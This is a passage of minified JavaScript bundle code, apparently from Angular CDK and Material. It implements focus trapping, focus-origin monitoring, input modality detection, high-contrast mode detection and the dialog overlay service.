                (null !== s ||
                  this._platform.FIREFOX ||
                  n.hasAttribute("controls"))
              : n.tabIndex >= 0);
    }
    isFocusable(n, r) {
      return (
        $E(n) &&
        !this.isDisabled(n) &&
        (r?.ignoreVisibility || this.isVisible(n))
      );
    }
  };
  return (
    (e.ɵfac = function (r) {
      return new (r || e)(h(ge));
    }),
    (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
    e
  );
})();
function NE(t) {
  try {
    return t.frameElement;
  } catch {
    return null;
  }
}
function kE(t) {
  return !!(
    t.offsetWidth ||
    t.offsetHeight ||
    ("function" == typeof t.getClientRects && t.getClientRects().length)
  );
}
function FE(t) {
  let e = t.nodeName.toLowerCase();
  return "input" === e || "select" === e || "button" === e || "textarea" === e;
}
function LE(t) {
  return VE(t) && "hidden" == t.type;
}
function jE(t) {
  return BE(t) && t.hasAttribute("href");
}
function VE(t) {
  return "input" == t.nodeName.toLowerCase();
}
function BE(t) {
  return "a" == t.nodeName.toLowerCase();
}
function Cv(t) {
  if (!t.hasAttribute("tabindex") || void 0 === t.tabIndex) return !1;
  let e = t.getAttribute("tabindex");
  return !(!e || isNaN(parseInt(e, 10)));
}
function vv(t) {
  if (!Cv(t)) return null;
  let e = parseInt(t.getAttribute("tabindex") || "", 10);
  return isNaN(e) ? -1 : e;
}
function UE(t) {
  let e = t.nodeName.toLowerCase(),
    i = "input" === e && t.type;
  return "text" === i || "password" === i || "select" === e || "textarea" === e;
}
function $E(t) {
  return (
    !LE(t) && (FE(t) || jE(t) || t.hasAttribute("contenteditable") || Cv(t))
  );
}
function HE(t) {
  return (t.ownerDocument && t.ownerDocument.defaultView) || window;
}
var rd = class {
    get enabled() {
      return this._enabled;
    }
    set enabled(e) {
      (this._enabled = e),
        this._startAnchor &&
          this._endAnchor &&
          (this._toggleAnchorTabIndex(e, this._startAnchor),
          this._toggleAnchorTabIndex(e, this._endAnchor));
    }
    constructor(e, i, n, r, o = !1) {
      (this._element = e),
        (this._checker = i),
        (this._ngZone = n),
        (this._document = r),
        (this._hasAttached = !1),
        (this.startAnchorListener = () => this.focusLastTabbableElement()),
        (this.endAnchorListener = () => this.focusFirstTabbableElement()),
        (this._enabled = !0),
        o || this.attachAnchors();
    }
    destroy() {
      let e = this._startAnchor,
        i = this._endAnchor;
      e &&
        (e.removeEventListener("focus", this.startAnchorListener), e.remove()),
        i &&
          (i.removeEventListener("focus", this.endAnchorListener), i.remove()),
        (this._startAnchor = this._endAnchor = null),
        (this._hasAttached = !1);
    }
    attachAnchors() {
      return (
        !!this._hasAttached ||
        (this._ngZone.runOutsideAngular(() => {
          this._startAnchor ||
            ((this._startAnchor = this._createAnchor()),
            this._startAnchor.addEventListener(
              "focus",
              this.startAnchorListener
            )),
            this._endAnchor ||
              ((this._endAnchor = this._createAnchor()),
              this._endAnchor.addEventListener(
                "focus",
                this.endAnchorListener
              ));
        }),
        this._element.parentNode &&
          (this._element.parentNode.insertBefore(
            this._startAnchor,
            this._element
          ),
          this._element.parentNode.insertBefore(
            this._endAnchor,
            this._element.nextSibling
          ),
          (this._hasAttached = !0)),
        this._hasAttached)
      );
    }
    focusInitialElementWhenReady(e) {
      return new Promise((i) => {
        this._executeOnStable(() => i(this.focusInitialElement(e)));
      });
    }
    focusFirstTabbableElementWhenReady(e) {
      return new Promise((i) => {
        this._executeOnStable(() => i(this.focusFirstTabbableElement(e)));
      });
    }
    focusLastTabbableElementWhenReady(e) {
      return new Promise((i) => {
        this._executeOnStable(() => i(this.focusLastTabbableElement(e)));
      });
    }
    _getRegionBoundary(e) {
      let i = this._element.querySelectorAll(
        `[cdk-focus-region-${e}], [cdkFocusRegion${e}], [cdk-focus-${e}]`
      );
      return "start" == e
        ? i.length
          ? i[0]
          : this._getFirstTabbableElement(this._element)
        : i.length
        ? i[i.length - 1]
        : this._getLastTabbableElement(this._element);
    }
    focusInitialElement(e) {
      let i = this._element.querySelector(
        "[cdk-focus-initial], [cdkFocusInitial]"
      );
      if (i) {
        if (!this._checker.isFocusable(i)) {
          let n = this._getFirstTabbableElement(i);
          return n?.focus(e), !!n;
        }
        return i.focus(e), !0;
      }
      return this.focusFirstTabbableElement(e);
    }
    focusFirstTabbableElement(e) {
      let i = this._getRegionBoundary("start");
      return i && i.focus(e), !!i;
    }
    focusLastTabbableElement(e) {
      let i = this._getRegionBoundary("end");
      return i && i.focus(e), !!i;
    }
    hasAttached() {
      return this._hasAttached;
    }
    _getFirstTabbableElement(e) {
      if (this._checker.isFocusable(e) && this._checker.isTabbable(e)) return e;
      let i = e.children;
      for (let n = 0; n < i.length; n++) {
        let r =
          i[n].nodeType === this._document.ELEMENT_NODE
            ? this._getFirstTabbableElement(i[n])
            : null;
        if (r) return r;
      }
      return null;
    }
    _getLastTabbableElement(e) {
      if (this._checker.isFocusable(e) && this._checker.isTabbable(e)) return e;
      let i = e.children;
      for (let n = i.length - 1; n >= 0; n--) {
        let r =
          i[n].nodeType === this._document.ELEMENT_NODE
            ? this._getLastTabbableElement(i[n])
            : null;
        if (r) return r;
      }
      return null;
    }
    _createAnchor() {
      let e = this._document.createElement("div");
      return (
        this._toggleAnchorTabIndex(this._enabled, e),
        e.classList.add("cdk-visually-hidden"),
        e.classList.add("cdk-focus-trap-anchor"),
        e.setAttribute("aria-hidden", "true"),
        e
      );
    }
    _toggleAnchorTabIndex(e, i) {
      e ? i.setAttribute("tabindex", "0") : i.removeAttribute("tabindex");
    }
    toggleAnchors(e) {
      this._startAnchor &&
        this._endAnchor &&
        (this._toggleAnchorTabIndex(e, this._startAnchor),
        this._toggleAnchorTabIndex(e, this._endAnchor));
    }
    _executeOnStable(e) {
      this._ngZone.isStable
        ? e()
        : this._ngZone.onStable.pipe(ue(1)).subscribe(e);
    }
  },
  _a = (() => {
    let e = class e {
      constructor(n, r, o) {
        (this._checker = n), (this._ngZone = r), (this._document = o);
      }
      create(n, r = !1) {
        return new rd(n, this._checker, this._ngZone, this._document, r);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(zr), h(O), h(T));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })();
function od(t) {
  return 0 === t.buttons || 0 === t.detail;
}
function sd(t) {
  let e =
    (t.touches && t.touches[0]) || (t.changedTouches && t.changedTouches[0]);
  return !(
    !e ||
    -1 !== e.identifier ||
    (null != e.radiusX && 1 !== e.radiusX) ||
    (null != e.radiusY && 1 !== e.radiusY)
  );
}
var zE = new b("cdk-input-modality-detector-options"),
  WE = { ignoreKeys: [18, 17, 224, 91, 16] },
  wv = 650,
  Mi = _i({ passive: !0, capture: !0 }),
  GE = (() => {
    let e = class e {
      get mostRecentModality() {
        return this._modality.value;
      }
      constructor(n, r, o, s) {
        (this._platform = n),
          (this._mostRecentTarget = null),
          (this._modality = new le(null)),
          (this._lastTouchMs = 0),
          (this._onKeydown = (a) => {
            this._options?.ignoreKeys?.some((c) => c === a.keyCode) ||
              (this._modality.next("keyboard"),
              (this._mostRecentTarget = nt(a)));
          }),
          (this._onMousedown = (a) => {
            Date.now() - this._lastTouchMs < wv ||
              (this._modality.next(od(a) ? "keyboard" : "mouse"),
              (this._mostRecentTarget = nt(a)));
          }),
          (this._onTouchstart = (a) => {
            sd(a)
              ? this._modality.next("keyboard")
              : ((this._lastTouchMs = Date.now()),
                this._modality.next("touch"),
                (this._mostRecentTarget = nt(a)));
          }),
          (this._options = C(C({}, WE), s)),
          (this.modalityDetected = this._modality.pipe(Pi(1))),
          (this.modalityChanged = this.modalityDetected.pipe(bo())),
          n.isBrowser &&
            r.runOutsideAngular(() => {
              o.addEventListener("keydown", this._onKeydown, Mi),
                o.addEventListener("mousedown", this._onMousedown, Mi),
                o.addEventListener("touchstart", this._onTouchstart, Mi);
            });
      }
      ngOnDestroy() {
        this._modality.complete(),
          this._platform.isBrowser &&
            (document.removeEventListener("keydown", this._onKeydown, Mi),
            document.removeEventListener("mousedown", this._onMousedown, Mi),
            document.removeEventListener("touchstart", this._onTouchstart, Mi));
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(ge), h(O), h(T), h(zE, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  va = (function (t) {
    return (
      (t[(t.IMMEDIATE = 0)] = "IMMEDIATE"),
      (t[(t.EVENTUAL = 1)] = "EVENTUAL"),
      t
    );
  })(va || {}),
  qE = new b("cdk-focus-monitor-default-options"),
  ma = _i({ passive: !0, capture: !0 }),
  ya = (() => {
    let e = class e {
      constructor(n, r, o, s, a) {
        (this._ngZone = n),
          (this._platform = r),
          (this._inputModalityDetector = o),
          (this._origin = null),
          (this._windowFocused = !1),
          (this._originFromTouchInteraction = !1),
          (this._elementInfo = new Map()),
          (this._monitoredElementCount = 0),
          (this._rootNodeFocusListenerCount = new Map()),
          (this._windowFocusListener = () => {
            (this._windowFocused = !0),
              (this._windowFocusTimeoutId = window.setTimeout(
                () => (this._windowFocused = !1)
              ));
          }),
          (this._stopInputModalityDetector = new N()),
          (this._rootNodeFocusAndBlurListener = (c) => {
            for (let u = nt(c); u; u = u.parentElement)
              "focus" === c.type ? this._onFocus(c, u) : this._onBlur(c, u);
          }),
          (this._document = s),
          (this._detectionMode = a?.detectionMode || va.IMMEDIATE);
      }
      monitor(n, r = !1) {
        let o = St(n);
        if (!this._platform.isBrowser || 1 !== o.nodeType) return x();
        let s = nv(o) || this._getDocument(),
          a = this._elementInfo.get(o);
        if (a) return r && (a.checkChildren = !0), a.subject;
        let c = { checkChildren: r, subject: new N(), rootNode: s };
        return (
          this._elementInfo.set(o, c),
          this._registerGlobalListeners(c),
          c.subject
        );
      }
      stopMonitoring(n) {
        let r = St(n),
          o = this._elementInfo.get(r);
        o &&
          (o.subject.complete(),
          this._setClasses(r),
          this._elementInfo.delete(r),
          this._removeGlobalListeners(o));
      }
      focusVia(n, r, o) {
        let s = St(n);
        s === this._getDocument().activeElement
          ? this._getClosestElementsInfo(s).forEach(([c, l]) =>
              this._originChanged(c, r, l)
            )
          : (this._setOrigin(r), "function" == typeof s.focus && s.focus(o));
      }
      ngOnDestroy() {
        this._elementInfo.forEach((n, r) => this.stopMonitoring(r));
      }
      _getDocument() {
        return this._document || document;
      }
      _getWindow() {
        return this._getDocument().defaultView || window;
      }
      _getFocusOrigin(n) {
        return this._origin
          ? this._originFromTouchInteraction
            ? this._shouldBeAttributedToTouch(n)
              ? "touch"
              : "program"
            : this._origin
          : this._windowFocused && this._lastFocusOrigin
          ? this._lastFocusOrigin
          : n && this._isLastInteractionFromInputLabel(n)
          ? "mouse"
          : "program";
      }
      _shouldBeAttributedToTouch(n) {
        return (
          this._detectionMode === va.EVENTUAL ||
          !!n?.contains(this._inputModalityDetector._mostRecentTarget)
        );
      }
      _setClasses(n, r) {
        n.classList.toggle("cdk-focused", !!r),
          n.classList.toggle("cdk-touch-focused", "touch" === r),
          n.classList.toggle("cdk-keyboard-focused", "keyboard" === r),
          n.classList.toggle("cdk-mouse-focused", "mouse" === r),
          n.classList.toggle("cdk-program-focused", "program" === r);
      }
      _setOrigin(n, r = !1) {
        this._ngZone.runOutsideAngular(() => {
          if (
            ((this._origin = n),
            (this._originFromTouchInteraction = "touch" === n && r),
            this._detectionMode === va.IMMEDIATE)
          ) {
            clearTimeout(this._originTimeoutId);
            let o = this._originFromTouchInteraction ? wv : 1;
            this._originTimeoutId = setTimeout(() => (this._origin = null), o);
          }
        });
      }
      _onFocus(n, r) {
        let o = this._elementInfo.get(r),
          s = nt(n);
        !o ||
          (!o.checkChildren && r !== s) ||
          this._originChanged(r, this._getFocusOrigin(s), o);
      }
      _onBlur(n, r) {
        let o = this._elementInfo.get(r);
        !o ||
          (o.checkChildren &&
            n.relatedTarget instanceof Node &&
            r.contains(n.relatedTarget)) ||
          (this._setClasses(r), this._emitOrigin(o, null));
      }
      _emitOrigin(n, r) {
        n.subject.observers.length && this._ngZone.run(() => n.subject.next(r));
      }
      _registerGlobalListeners(n) {
        if (!this._platform.isBrowser) return;
        let r = n.rootNode,
          o = this._rootNodeFocusListenerCount.get(r) || 0;
        o ||
          this._ngZone.runOutsideAngular(() => {
            r.addEventListener("focus", this._rootNodeFocusAndBlurListener, ma),
              r.addEventListener(
                "blur",
                this._rootNodeFocusAndBlurListener,
                ma
              );
          }),
          this._rootNodeFocusListenerCount.set(r, o + 1),
          1 == ++this._monitoredElementCount &&
            (this._ngZone.runOutsideAngular(() => {
              this._getWindow().addEventListener(
                "focus",
                this._windowFocusListener
              );
            }),
            this._inputModalityDetector.modalityDetected
              .pipe(st(this._stopInputModalityDetector))
              .subscribe((s) => {
                this._setOrigin(s, !0);
              }));
      }
      _removeGlobalListeners(n) {
        let r = n.rootNode;
        if (this._rootNodeFocusListenerCount.has(r)) {
          let o = this._rootNodeFocusListenerCount.get(r);
          o > 1
            ? this._rootNodeFocusListenerCount.set(r, o - 1)
            : (r.removeEventListener(
                "focus",
                this._rootNodeFocusAndBlurListener,
                ma
              ),
              r.removeEventListener(
                "blur",
                this._rootNodeFocusAndBlurListener,
                ma
              ),
              this._rootNodeFocusListenerCount.delete(r));
        }
        --this._monitoredElementCount ||
          (this._getWindow().removeEventListener(
            "focus",
            this._windowFocusListener
          ),
          this._stopInputModalityDetector.next(),
          clearTimeout(this._windowFocusTimeoutId),
          clearTimeout(this._originTimeoutId));
      }
      _originChanged(n, r, o) {
        this._setClasses(n, r),
          this._emitOrigin(o, r),
          (this._lastFocusOrigin = r);
      }
      _getClosestElementsInfo(n) {
        let r = [];
        return (
          this._elementInfo.forEach((o, s) => {
            (s === n || (o.checkChildren && s.contains(n))) && r.push([s, o]);
          }),
          r
        );
      }
      _isLastInteractionFromInputLabel(n) {
        let { _mostRecentTarget: r, mostRecentModality: o } =
          this._inputModalityDetector;
        if (
          "mouse" !== o ||
          !r ||
          r === n ||
          ("INPUT" !== n.nodeName && "TEXTAREA" !== n.nodeName) ||
          n.disabled
        )
          return !1;
        let s = n.labels;
        if (s)
          for (let a = 0; a < s.length; a++) if (s[a].contains(r)) return !0;
        return !1;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(O), h(ge), h(GE), h(T, 8), h(qE, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  xn = (function (t) {
    return (
      (t[(t.NONE = 0)] = "NONE"),
      (t[(t.BLACK_ON_WHITE = 1)] = "BLACK_ON_WHITE"),
      (t[(t.WHITE_ON_BLACK = 2)] = "WHITE_ON_BLACK"),
      t
    );
  })(xn || {}),
  _v = "cdk-high-contrast-black-on-white",
  yv = "cdk-high-contrast-white-on-black",
  id = "cdk-high-contrast-active",
  ad = (() => {
    let e = class e {
      constructor(n, r) {
        (this._platform = n),
          (this._document = r),
          (this._breakpointSubscription = v(mv)
            .observe("(forced-colors: active)")
            .subscribe(() => {
              this._hasCheckedHighContrastMode &&
                ((this._hasCheckedHighContrastMode = !1),
                this._applyBodyHighContrastModeCssClasses());
            }));
      }
      getHighContrastMode() {
        if (!this._platform.isBrowser) return xn.NONE;
        let n = this._document.createElement("div");
        (n.style.backgroundColor = "rgb(1,2,3)"),
          (n.style.position = "absolute"),
          this._document.body.appendChild(n);
        let r = this._document.defaultView || window,
          o = r && r.getComputedStyle ? r.getComputedStyle(n) : null,
          s = ((o && o.backgroundColor) || "").replace(/ /g, "");
        switch ((n.remove(), s)) {
          case "rgb(0,0,0)":
          case "rgb(45,50,54)":
          case "rgb(32,32,32)":
            return xn.WHITE_ON_BLACK;
          case "rgb(255,255,255)":
          case "rgb(255,250,239)":
            return xn.BLACK_ON_WHITE;
        }
        return xn.NONE;
      }
      ngOnDestroy() {
        this._breakpointSubscription.unsubscribe();
      }
      _applyBodyHighContrastModeCssClasses() {
        if (
          !this._hasCheckedHighContrastMode &&
          this._platform.isBrowser &&
          this._document.body
        ) {
          let n = this._document.body.classList;
          n.remove(id, _v, yv), (this._hasCheckedHighContrastMode = !0);
          let r = this.getHighContrastMode();
          r === xn.BLACK_ON_WHITE
            ? n.add(id, _v)
            : r === xn.WHITE_ON_BLACK && n.add(id, yv);
        }
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(ge), h(T));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  bv = (() => {
    let e = class e {
      constructor(n) {
        n._applyBodyHighContrastModeCssClasses();
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(ad));
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({ imports: [hv] })),
      e
    );
  })();
function YE(t, e) {}
var En = class {
    constructor() {
      (this.role = "dialog"),
        (this.panelClass = ""),
        (this.hasBackdrop = !0),
        (this.backdropClass = ""),
        (this.disableClose = !1),
        (this.width = ""),
        (this.height = ""),
        (this.data = null),
        (this.ariaDescribedBy = null),
        (this.ariaLabelledBy = null),
        (this.ariaLabel = null),
        (this.ariaModal = !0),
        (this.autoFocus = "first-tabbable"),
        (this.restoreFocus = !0),
        (this.closeOnNavigation = !0),
        (this.closeOnDestroy = !0),
        (this.closeOnOverlayDetachments = !0);
    }
  },
  dd = (() => {
    let e = class e extends wi {
      constructor(n, r, o, s, a, c, l, u) {
        super(),
          (this._elementRef = n),
          (this._focusTrapFactory = r),
          (this._config = s),
          (this._interactivityChecker = a),
          (this._ngZone = c),
          (this._overlayRef = l),
          (this._focusMonitor = u),
          (this._platform = v(ge)),
          (this._focusTrap = null),
          (this._elementFocusedBeforeDialogWasOpened = null),
          (this._closeInteractionType = null),
          (this._ariaLabelledByQueue = []),
          (this._changeDetectorRef = v(Ot)),
          (this.attachDomPortal = (d) => {
            this._portalOutlet.hasAttached();
            let f = this._portalOutlet.attachDomPortal(d);
            return this._contentAttached(), f;
          }),
          (this._document = o),
          this._config.ariaLabelledBy &&
            this._ariaLabelledByQueue.push(this._config.ariaLabelledBy);
      }
      _addAriaLabelledBy(n) {
        this._ariaLabelledByQueue.push(n),
          this._changeDetectorRef.markForCheck();
      }
      _removeAriaLabelledBy(n) {
        let r = this._ariaLabelledByQueue.indexOf(n);
        r > -1 &&
          (this._ariaLabelledByQueue.splice(r, 1),
          this._changeDetectorRef.markForCheck());
      }
      _contentAttached() {
        this._initializeFocusTrap(),
          this._handleBackdropClicks(),
          this._captureInitialFocus();
      }
      _captureInitialFocus() {
        this._trapFocus();
      }
      ngOnDestroy() {
        this._restoreFocus();
      }
      attachComponentPortal(n) {
        this._portalOutlet.hasAttached();
        let r = this._portalOutlet.attachComponentPortal(n);
        return this._contentAttached(), r;
      }
      attachTemplatePortal(n) {
        this._portalOutlet.hasAttached();
        let r = this._portalOutlet.attachTemplatePortal(n);
        return this._contentAttached(), r;
      }
      _recaptureFocus() {
        this._containsFocus() || this._trapFocus();
      }
      _forceFocus(n, r) {
        this._interactivityChecker.isFocusable(n) ||
          ((n.tabIndex = -1),
          this._ngZone.runOutsideAngular(() => {
            let o = () => {
              n.removeEventListener("blur", o),
                n.removeEventListener("mousedown", o),
                n.removeAttribute("tabindex");
            };
            n.addEventListener("blur", o), n.addEventListener("mousedown", o);
          })),
          n.focus(r);
      }
      _focusByCssSelector(n, r) {
        let o = this._elementRef.nativeElement.querySelector(n);
        o && this._forceFocus(o, r);
      }
      _trapFocus() {
        let n = this._elementRef.nativeElement;
        switch (this._config.autoFocus) {
          case !1:
          case "dialog":
            this._containsFocus() || n.focus();
            break;
          case !0:
          case "first-tabbable":
            this._focusTrap?.focusInitialElementWhenReady().then((r) => {
              r || this._focusDialogContainer();
            });
            break;
          case "first-heading":
            this._focusByCssSelector(
              'h1, h2, h3, h4, h5, h6, [role="heading"]'
            );
            break;
          default:
            this._focusByCssSelector(this._config.autoFocus);
        }
      }
      _restoreFocus() {
        let n = this._config.restoreFocus,
          r = null;
        if (
          ("string" == typeof n
            ? (r = this._document.querySelector(n))
            : "boolean" == typeof n
            ? (r = n ? this._elementFocusedBeforeDialogWasOpened : null)
            : n && (r = n),
          this._config.restoreFocus && r && "function" == typeof r.focus)
        ) {
          let o = jr(),
            s = this._elementRef.nativeElement;
          (!o || o === this._document.body || o === s || s.contains(o)) &&
            (this._focusMonitor
              ? (this._focusMonitor.focusVia(r, this._closeInteractionType),
                (this._closeInteractionType = null))
              : r.focus());
        }
        this._focusTrap && this._focusTrap.destroy();
      }
      _focusDialogContainer() {
        this._elementRef.nativeElement.focus &&
          this._elementRef.nativeElement.focus();
      }
      _containsFocus() {
        let n = this._elementRef.nativeElement,
          r = jr();
        return n === r || n.contains(r);
      }
      _initializeFocusTrap() {
        this._platform.isBrowser &&
          ((this._focusTrap = this._focusTrapFactory.create(
            this._elementRef.nativeElement
          )),
          this._document && (this._elementFocusedBeforeDialogWasOpened = jr()));
      }
      _handleBackdropClicks() {
        this._overlayRef.backdropClick().subscribe(() => {
          this._config.disableClose && this._recaptureFocus();
        });
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(
          P(te),
          P(_a),
          P(T, 8),
          P(En),
          P(zr),
          P(O),
          P(Tt),
          P(ya)
        );
      }),
      (e.ɵcmp = he({
        type: e,
        selectors: [["cdk-dialog-container"]],
        viewQuery: function (r, o) {
          if ((1 & r && Ss($r, 7), 2 & r)) {
            let s;
            or((s = sr())) && (o._portalOutlet = s.first);
          }
        },
        hostAttrs: ["tabindex", "-1", 1, "cdk-dialog-container"],
        hostVars: 6,
        hostBindings: function (r, o) {
          2 & r &&
            xt("id", o._config.id || null)("role", o._config.role)(
              "aria-modal",
              o._config.ariaModal
            )(
              "aria-labelledby",
              o._config.ariaLabel ? null : o._ariaLabelledByQueue[0]
            )("aria-label", o._config.ariaLabel)(
              "aria-describedby",
              o._config.ariaDescribedBy || null
            );
        },
        standalone: !0,
        features: [zt, qt],
        decls: 1,
        vars: 0,
        consts: [["cdkPortalOutlet", ""]],
        template: function (r, o) {
          1 & r && et(0, YE, 0, 0, "ng-template", 0);
        },
        dependencies: [$r],
        styles: [
          ".cdk-dialog-container{display:block;width:100%;height:100%;min-height:inherit;max-height:inherit}",
        ],
        encapsulation: 2,
      })),
      e
    );
  })(),
  Wr = class {
    constructor(e, i) {
      (this.overlayRef = e),
        (this.config = i),
        (this.closed = new N()),
        (this.disableClose = i.disableClose),
        (this.backdropClick = e.backdropClick()),
        (this.keydownEvents = e.keydownEvents()),
        (this.outsidePointerEvents = e.outsidePointerEvents()),
        (this.id = i.id),
        this.keydownEvents.subscribe((n) => {
          27 === n.keyCode &&
            !this.disableClose &&
            !ha(n) &&
            (n.preventDefault(),
            this.close(void 0, { focusOrigin: "keyboard" }));
        }),
        this.backdropClick.subscribe(() => {
          this.disableClose || this.close(void 0, { focusOrigin: "mouse" });
        }),
        (this._detachSubscription = e.detachments().subscribe(() => {
          !1 !== i.closeOnOverlayDetachments && this.close();
        }));
    }
    close(e, i) {
      if (this.containerInstance) {
        let n = this.closed;
        (this.containerInstance._closeInteractionType =
          i?.focusOrigin || "program"),
          this._detachSubscription.unsubscribe(),
          this.overlayRef.dispose(),
          n.next(e),
          n.complete(),
          (this.componentInstance = this.containerInstance = null);
      }
    }
    updatePosition() {
      return this.overlayRef.updatePosition(), this;
    }
    updateSize(e = "", i = "") {
      return this.overlayRef.updateSize({ width: e, height: i }), this;
    }
    addPanelClass(e) {
      return this.overlayRef.addPanelClass(e), this;
    }
    removePanelClass(e) {
      return this.overlayRef.removePanelClass(e), this;
    }
  },
  ZE = new b("DialogScrollStrategy", {
    providedIn: "root",
    factory: () => {
      let t = v(it);
      return () => t.scrollStrategies.block();
    },
  }),
  QE = new b("DialogData"),
  KE = new b("DefaultDialogConfig"),
  XE = 0,
  fd = (() => {
    let e = class e {
      get openDialogs() {
        return this._parentDialog
          ? this._parentDialog.openDialogs
          : this._openDialogsAtThisLevel;
      }
      get afterOpened() {
        return this._parentDialog
          ? this._parentDialog.afterOpened
          : this._afterOpenedAtThisLevel;
      }
      constructor(n, r, o, s, a, c) {
        (this._overlay = n),
          (this._injector = r),
          (this._defaultOptions = o),
          (this._parentDialog = s),
          (this._overlayContainer = a),
          (this._openDialogsAtThisLevel = []),
          (this._afterAllClosedAtThisLevel = new N()),
          (this._afterOpenedAtThisLevel = new N()),
          (this._ariaHiddenElements = new Map()),
          (this.afterAllClosed = Nt(() =>
            this.openDialogs.length
              ? this._getAfterAllClosed()
              : this._getAfterAllClosed().pipe(ot(void 0))
          )),
          (this._scrollStrategy = c);
      }
      open(n, r) {
        let o = this._defaultOptions || new En();
        ((r = C(C({}, o), r)).id = r.id || "cdk-dialog-" + XE++),
          r.id && this.getDialogById(r.id);
        let s = this._getOverlayConfig(r),
          a = this._overlay.create(s),
          c = new Wr(a, r),
          l = this._attachContainer(a, c, r);
        return (
          (c.containerInstance = l),
          this._attachDialogContent(n, c, l, r),
          this.openDialogs.length ||
            this._hideNonDialogContentFromAssistiveTechnology(),
          this.openDialogs.push(c),
          c.closed.subscribe(() => this._removeOpenDialog(c, !0)),
          this.afterOpened.next(c),
          c
        );
      }
      closeAll() {
        ld(this.openDialogs, (n) => n.close());
      }
      getDialogById(n) {
        return this.openDialogs.find((r) => r.id === n);
      }
      ngOnDestroy() {
        ld(this._openDialogsAtThisLevel, (n) => {
          !1 === n.config.closeOnDestroy && this._removeOpenDialog(n, !1);
        }),
          ld(this._openDialogsAtThisLevel, (n) => n.close()),
          this._afterAllClosedAtThisLevel.complete(),
          this._afterOpenedAtThisLevel.complete(),
          (this._openDialogsAtThisLevel = []);
      }
      _getOverlayConfig(n) {
        let r = new Hr({
          positionStrategy:
            n.positionStrategy ||
            this._overlay
              .position()
              .global()
              .centerHorizontally()
              .centerVertically(),
          scrollStrategy: n.scrollStrategy || this._scrollStrategy(),
          panelClass: n.panelClass,
          hasBackdrop: n.hasBackdrop,
          direction: n.direction,
          minWidth: n.minWidth,
          minHeight: n.minHeight,
          maxWidth: n.maxWidth,
          maxHeight: n.maxHeight,
          width: n.width,
          height: n.height,
          disposeOnNavigation: n.closeOnNavigation,
        });
        return n.backdropClass && (r.backdropClass = n.backdropClass), r;
      }
      _attachContainer(n, r, o) {
        let c,
          s = o.injector || o.viewContainerRef?.injector,
          a = [
            { provide: En, useValue: o },
            { provide: Wr, useValue: r },
            { provide: Tt, useValue: n },
          ];
        o.container
          ? "function" == typeof o.container
            ? (c = o.container)
            : ((c = o.container.type), a.push(...o.container.providers(o)))
          : (c = dd);
        let l = new yi(
          c,
          o.viewContainerRef,
          re.create({ parent: s || this._injector, providers: a }),
          o.componentFactoryResolver
        );
        return n.attach(l).instance;
      }
      _attachDialogContent(n, r, o, s) {
        if (n instanceof Le) {
          let a = this._createInjector(s, r, o, void 0),
            c = { $implicit: s.data, dialogRef: r };
          s.templateContext &&
            (c = C(
              C({}, c),
              "function" == typeof s.templateContext
                ? s.templateContext()
                : s.templateContext
            )),
            o.attachTemplatePortal(new Ci(n, null, c, a));
        } else {
          let a = this._createInjector(s, r, o, this._injector),
            c = o.attachComponentPortal(
              new yi(n, s.viewContainerRef, a, s.componentFactoryResolver)
            );
          (r.componentRef = c), (r.componentInstance = c.instance);
        }
      }
      _createInjector(n, r, o, s) {
        let a = n.injector || n.viewContainerRef?.injector,
          c = [
            { provide: QE, useValue: n.data },
            { provide: Wr, useValue: r },
          ];
        return (
          n.providers &&
            ("function" == typeof n.providers
              ? c.push(...n.providers(r, n, o))
              : c.push(...n.providers)),
          n.direction &&
            (!a || !a.get(Br, null, { optional: !0 })) &&
            c.push({
              provide: Br,
              useValue: { value: n.direction, change: x() },
            }),
          re.create({ parent: a || s, providers: c })
        );
      }
      _removeOpenDialog(n, r) {
        let o = this.openDialogs.indexOf(n);
        o > -1 &&
          (this.openDialogs.splice(o, 1),
          this.openDialogs.length ||
            (this._ariaHiddenElements.forEach((s, a) => {
              s
                ? a.setAttribute("aria-hidden", s)
                : a.removeAttribute("aria-hidden");
            }),
            this._ariaHiddenElements.clear(),
            r && this._getAfterAllClosed().next()));
      }
      _hideNonDialogContentFromAssistiveTechnology() {
        let n = this._overlayContainer.getContainerElement();
        if (n.parentElement) {
          let r = n.parentElement.children;
          for (let o = r.length - 1; o > -1; o--) {
            let s = r[o];
            s !== n &&
              "SCRIPT" !== s.nodeName &&
              "STYLE" !== s.nodeName &&
              !s.hasAttribute("aria-live") &&
              (this._ariaHiddenElements.set(s, s.getAttribute("aria-hidden")),
              s.setAttribute("aria-hidden", "true"));
          }
        }
      }
      _getAfterAllClosed() {
        let n = this._parentDialog;
        return n ? n._getAfterAllClosed() : this._afterAllClosedAtThisLevel;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(it), h(re), h(KE, 8), h(e, 12), h(bi), h(ZE));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })();
function ld(t, e) {
  let i = t.length;
  for (; i--; ) e(t[i]);
}
var Mv = (() => {
  let e = class e {};
  return (
    (e.ɵfac = function (r) {
      return new (r || e)();
    }),
    (e.ɵmod = $({ type: e })),
    (e.ɵinj = U({ providers: [fd], imports: [ga, bn, bv, bn] })),
    e
  );
})();
function JE() {
  return !0;
}
var eO = new b("mat-sanity-checks", { providedIn: "root", factory: JE }),
  gd = (() => {
    let e = class e {
      constructor(n, r, o) {
        (this._sanityChecks = r),
          (this._document = o),
          (this._hasDoneGlobalChecks = !1),
          n._applyBodyHighContrastModeCssClasses(),
          this._hasDoneGlobalChecks || (this._hasDoneGlobalChecks = !0);
      }
      _checkIsEnabled(n) {
        return (
          !Vr() &&
          ("boolean" == typeof this._sanityChecks
            ? this._sanityChecks
